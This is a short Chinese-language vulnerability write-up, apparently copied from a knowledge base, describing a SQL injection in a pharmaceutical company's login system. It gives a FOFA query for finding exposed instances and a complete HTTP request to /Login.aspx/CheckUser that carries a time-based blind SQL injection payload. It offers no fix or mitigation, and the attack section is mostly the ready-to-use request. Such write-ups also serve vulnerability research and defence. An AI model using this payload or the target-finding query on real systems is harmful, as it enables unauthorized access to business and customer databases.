# 医药公司登录系统存在SQL注入漏洞

# 一、漏洞简介
医药公司登录系统是一个全面且高效的管理工具，涵盖了销售管理、客户档案管理、药品字典管理等多个核心模块。该系统支持前台零售、批发销售、销售审核等多种销售方式，并具备完善的客户档案管理功能，包括客户的基本信息、经营权限等。此外，系统还提供国药标准药品字典库云下载功能，便于用户快速获取药品信息。整体而言，医药公司登录系统通过自动化的管理和数据分析，帮助医药企业优化业务流程，提升市场竞争力。

# 二、影响版本
+ 医药公司登录系统

# 三、资产测绘
+ fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`

![1718300393150-bc4c042c-e623-4c35-bd2f-b019efc0686a.png](./img/ozPPteBCOVE52AVP/1718300393150-bc4c042c-e623-4c35-bd2f-b019efc0686a-788714.png)

# 四、漏洞复现
```http
POST /Login.aspx/CheckUser HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=utf-8
Priority: u=1

{"value":"' waitfor delay '0:0:5'--+"}
```

![1718300458322-719caf40-b4e1-4836-a62c-a0aca66ca420.png](./img/ozPPteBCOVE52AVP/1718300458322-719caf40-b4e1-4836-a62c-a0aca66ca420-062181.png)



> 更新: 2024-06-17 09:24:15  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fq92t7qp61yzgzp1>